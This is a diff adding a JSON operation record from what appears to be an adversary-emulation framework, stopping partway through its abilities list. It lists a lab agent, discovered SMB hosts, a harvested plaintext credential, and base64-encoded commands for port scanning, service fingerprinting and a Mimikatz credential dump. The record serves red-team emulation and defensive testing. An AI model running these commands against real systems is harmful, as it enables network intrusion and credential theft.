@@ -1,0 +1,3376 @@
+{
+    "name": "winplus",
+    "id": 1,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "kali$root",
+            "last_seen": "2020-03-28 14:47:00",
+            "architecture": "amd64",
+            "platform": "linux",
+            "server": "http://192.168.1.250:8888",
+            "host_group": "my_group",
+            "location": "/tmp/sandcat-linux",
+            "pid": 76171,
+            "ppid": 10633,
+            "trusted": 1,
+            "last_trusted_seen": "2020-03-28 14:47:00",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "sh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "pwsh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2020-03-28 14:36:11",
+    "facts": [
+        {
+            "id": 26,
+            "property": "remote.host.ip",
+            "value": "192.168.1.10",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 27,
+            "property": "remote.host.ip",
+            "value": "192.168.1.11",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 28,
+            "property": "remote.host.ip",
+            "value": "192.168.1.12",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 29,
+            "property": "remote.host.ip",
+            "value": "192.168.1.100",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 30,
+            "property": "remote.host.ip",
+            "value": "192.168.1.107",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 31,
+            "property": "remote.host.ip",
+            "value": "192.168.1.108",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 32,
+            "property": "remote.host.ip",
+            "value": "192.168.1.110",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 33,
+            "property": "remote.host.ip",
+            "value": "192.168.1.111",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 34,
+            "property": "remote.host.ip",
+            "value": "192.168.1.117",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 35,
+            "property": "remote.host.ip",
+            "value": "192.168.1.118",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 36,
+            "property": "remote.host.ip",
+            "value": "192.168.1.120",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "4",
+            "link_id": null
+        },
+        {
+            "id": 41,
+            "property": "remote.host.socket",
+            "value": "192.168.1.10:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 1
+        },
+        {
+            "id": 42,
+            "property": "remote.host.socket",
+            "value": "192.168.1.100:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 4
+        },
+        {
+            "id": 43,
+            "property": "remote.host.socket",
+            "value": "192.168.1.107:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 5
+        },
+        {
+            "id": 44,
+            "property": "remote.host.socket",
+            "value": "192.168.1.110:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 7
+        },
+        {
+            "id": 45,
+            "property": "remote.host.socket",
+            "value": "192.168.1.111:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 8
+        },
+        {
+            "id": 46,
+            "property": "remote.host.socket",
+            "value": "192.168.1.117:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 9
+        },
+        {
+            "id": 47,
+            "property": "remote.service.smb",
+            "value": "192.168.1.10:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 42
+        },
+        {
+            "id": 48,
+            "property": "remote.service.smb",
+            "value": "192.168.1.100:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 43
+        },
+        {
+            "id": 49,
+            "property": "remote.service.smb",
+            "value": "192.168.1.107:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 44
+        },
+        {
+            "id": 50,
+            "property": "remote.service.smb",
+            "value": "192.168.1.110:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 45
+        },
+        {
+            "id": 51,
+            "property": "remote.service.smb",
+            "value": "192.168.1.111:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 46
+        },
+        {
+            "id": 52,
+            "property": "remote.service.smb",
+            "value": "192.168.1.117:445",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 47
+        },
+        {
+            "id": 53,
+            "property": "remote.host.credentials",
+            "value": "192.168.1.117:445:zathras:password1!",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "6",
+            "link_id": 65
+        }
+    ],
+    "finish": "2020-03-28 14:47:10",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 21,
+        "adversary_id": "c21a3dfa-d7cf-4069-a6af-027c861d8625",
+        "name": "big_adversary_fingerprint",
+        "description": "large adversary with many fingerprinting services",
+        "phases": {
+            "1": [
+                {
+                    "id": 39,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "cHl0aG9uMyAuL3NjYW5uZXIucHkgLWkgI3tyZW1vdGUuaG9zdC5pcH0=",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 39,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 39,
+                            "payload": "scanner.py"
+                        }
+                    ],
+                    "adversary_map_id": 93
+                },
+                {
+                    "id": 40,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "cHl0aG9uMyAuL3NjYW5uZXIucHkgLWkgI3tyZW1vdGUuaG9zdC5pcH0=",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 40,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 40,
+                            "payload": "scanner.py"
+                        }
+                    ],
+                    "adversary_map_id": 93
+                },
+                {
+                    "id": 42,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "QzpcVXNlcnNcUHVibGljXHNjYW5uZXIuZXhlIC1pICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 42,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 42,
+                            "payload": "scanner.exe"
+                        }
+                    ],
+                    "adversary_map_id": 93
+                },
+                {
+                    "id": 41,
+                    "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan IP for ports",
+                    "test": "QzpcVXNlcnNcUHVibGljXHNjYW5uZXIuZXhlIC1pICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Use dropped scanner to find open popular ports",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 41,
+                            "name": "line",
+                            "property": "remote.host.socket",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 41,
+                            "payload": "scanner.exe"
+                        }
+                    ],
+                    "adversary_map_id": 93
+                },
+                {
+                    "id": 111,
+                    "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+                    "tactic": "credential-access",
+                    "technique_name": "Credential Dumping",
+                    "technique_id": "T1003",
+                    "name": "Run Mimikatz",
+                    "test": "LiBDOlxVc2Vyc1xQdWJsaWNcSW52b2tlLU1pbWlrYXR6LnBzMSAyPiAkbnVsbDsgSW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHMgfCBPdXQtZmlsZSBDOlxVc2Vyc1xQdWJsaWNcbWltaWR1bXAgOyBDOlxVc2Vyc1xQdWJsaWNccGFyc2UtbWltaWthdHoucHMxIDI+ICRudWxs",
+                    "description": "Use powershell to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 111,
+                            "name": "line",
+                            "property": "domain.user.password",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 111,
+                            "payload": "Invoke-Mimikatz.ps1, parse-mimikatz.ps1"
+                        }
+                    ],
+                    "adversary_map_id": 94
+                }
+            ],
+            "2": [
+                {
+                    "id": 57,
+                    "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint Apache Struts",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBBcGFjaGVTdHJ1dHM=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 57,
+                            "name": "line",
+                            "property": "remote.service.apachestruts",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 57,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 95
+                },
+                {
+                    "id": 58,
+                    "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint Apache Struts",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBBcGFjaGVTdHJ1dHM=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 58,
+                            "name": "line",
+                            "property": "remote.service.apachestruts",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 58,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 95
+                },
+                {
+                    "id": 60,
+                    "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint Apache Struts",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgQXBhY2hlU3RydXRz",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 60,
+                            "name": "line",
+                            "property": "remote.service.apachestruts",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 60,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 95
+                },
+                {
+                    "id": 59,
+                    "ability_id": "00d0b0bd-d411-4a3d-bcbd-32687d10c03f",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint Apache Struts",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgQXBhY2hlU3RydXRz",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 59,
+                            "name": "line",
+                            "property": "remote.service.apachestruts",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 59,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 95
+                },
+                {
+                    "id": 72,
+                    "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint Telnet",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyB0ZWxuZXQ=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 72,
+                            "name": "line",
+                            "property": "remote.service.telnet",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 72,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 96
+                },
+                {
+                    "id": 73,
+                    "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint Telnet",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyB0ZWxuZXQ=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 73,
+                            "name": "line",
+                            "property": "remote.service.telnet",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 73,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 96
+                },
+                {
+                    "id": 75,
+                    "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint Telnet",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgdGVsbmV0",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 75,
+                            "name": "line",
+                            "property": "remote.service.telnet",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 75,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 96
+                },
+                {
+                    "id": 74,
+                    "ability_id": "01526ad5-025e-46d4-ace6-eadd2ea4f55b",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint Telnet",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgdGVsbmV0",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 74,
+                            "name": "line",
+                            "property": "remote.service.telnet",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 74,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 96
+                },
+                {
+                    "id": 26,
+                    "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint FTP",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBmdHA=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 26,
+                            "name": "line",
+                            "property": "remote.service.ftp",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 26,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 102
+                },
+                {
+                    "id": 27,
+                    "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint FTP",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBmdHA=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 27,
+                            "name": "line",
+                            "property": "remote.service.ftp",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 27,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 102
+                },
+                {
+                    "id": 29,
+                    "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint FTP",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgZnRw",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 29,
+                            "name": "line",
+                            "property": "remote.service.ftp",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 29,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 102
+                },
+                {
+                    "id": 28,
+                    "ability_id": "05c622b0-1ea4-40f3-8b45-affb97befa3d",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Quick Fingerprint FTP",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgZnRw",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 28,
+                            "name": "line",
+                            "property": "remote.service.ftp",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 28,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 102
+                },
+                {
+                    "id": 13,
+                    "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint IIS",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBJSVM=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 13,
+                            "name": "line",
+                            "property": "remote.service.iis",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 13,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 97
+                },
+                {
+                    "id": 14,
+                    "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint IIS",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBJSVM=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 14,
+                            "name": "line",
+                            "property": "remote.service.iis",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 14,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 97
+                },
+                {
+                    "id": 16,
+                    "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint IIS",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgSUlT",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 16,
+                            "name": "line",
+                            "property": "remote.service.iis",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 16,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 97
+                },
+                {
+                    "id": 15,
+                    "ability_id": "1e0ff374-63e2-4456-bece-f73732de08a1",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint IIS",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgSUlT",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 15,
+                            "name": "line",
+                            "property": "remote.service.iis",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 15,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 97
+                },
+                {
+                    "id": 67,
+                    "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint ThinkPHP",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBUaGlua1BIUA==",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 67,
+                            "name": "line",
+                            "property": "remote.service.thinkphp",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 67,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 98
+                },
+                {
+                    "id": 68,
+                    "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint ThinkPHP",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBUaGlua1BIUA==",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 68,
+                            "name": "line",
+                            "property": "remote.service.thinkphp",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 68,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 98
+                },
+                {
+                    "id": 70,
+                    "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint ThinkPHP",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgVGhpbmtQSFA=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 70,
+                            "name": "line",
+                            "property": "remote.service.thinkphp",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 70,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 98
+                },
+                {
+                    "id": 69,
+                    "ability_id": "48faddd2-d150-4c2b-ac8f-e2c85b98c84c",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint ThinkPHP",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgVGhpbmtQSFA=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 69,
+                            "name": "line",
+                            "property": "remote.service.thinkphp",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 69,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 98
+                },
+                {
+                    "id": 43,
+                    "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint Trendnet Cameras",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBUcmVuZG5ldA==",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [
+                        {
+                            "ability": 43,
+                            "name": "line",
+                            "property": "remote.service.trendnet",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 43,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 99
+                },
+                {
+                    "id": 44,
+                    "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint Trendnet Cameras",
+                    "test": "cHl0aG9uMyAuL2ZpbmdlcnByaW50LnB5IC1zICN7cmVtb3RlLmhvc3Quc29ja2V0fSAtYyBUcmVuZG5ldA==",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [
+                        {
+                            "ability": 44,
+                            "name": "line",
+                            "property": "remote.service.trendnet",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 44,
+                            "payload": "fingerprint.py"
+                        }
+                    ],
+                    "adversary_map_id": 99
+                },
+                {
+                    "id": 46,
+                    "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint Trendnet Cameras",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgVHJlbmRuZXQ=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 46,
+                            "name": "line",
+                            "property": "remote.service.trendnet",
+                            "script": ""
+                        }
+                    ],
+                    "payload": [
+                        {
+                            "ability": 46,
+                            "payload": "fingerprint.exe"
+                        }
+                    ],
+                    "adversary_map_id": 99
+                },
+                {
+                    "id": 45,
+                    "ability_id": "50363ad7-ce2e-42b1-a4be-04b041f65a9d",
+                    "tactic": "discovery",
+                    "technique_name": "Network Service Scanning",
+                    "technique_id": "T1046",
+                    "name": "Scan Host to Fingerprint Trendnet Cameras",
+                    "test": "QzpcVXNlcnNcUHVibGljXGZpbmdlcnByaW50LmV4ZSAtcyAje3JlbW90ZS5ob3N0LnNvY2tldH0gLWMgVHJlbmRuZXQ=",
+                    "description": "Use dropped fingerprinter to find popular services",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 45,
+                            "name": "line",
+                            "property": "remote.service.trendnet",
+                            "script": ""
+                        }
+                    ],
